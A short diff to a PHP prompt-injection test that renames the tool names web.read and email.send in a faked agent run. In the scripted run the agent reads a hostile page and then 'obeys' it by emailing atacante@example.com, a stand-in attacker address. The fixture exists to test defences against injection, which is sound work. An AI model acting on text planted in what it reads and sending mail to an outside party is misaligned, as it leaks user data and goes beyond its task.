@@ -90,8 +90,8 @@ class PromptInjectionTest extends TestCase
 
         // Step 1 reads the hostile page; step 2 "obeys" it and calls the write tool.
         Ai::fakeAgent(RuntimeAgent::class, [
-            new ToolCall('call-read', 'web.read', []),
-            new ToolCall('call-send', 'email.send', ['to' => 'atacante@example.com']),
+            new ToolCall('call-read', 'web_read', []),
+            new ToolCall('call-send', 'email_send', ['to' => 'atacante@example.com']),
             'Pronto.',
         ]);
         Ai::fakeAgent(StructuredAnonymousAgent::class, fn (): array => ['result' => ['type' => 'text', 'text' => 'Pronto.']]);
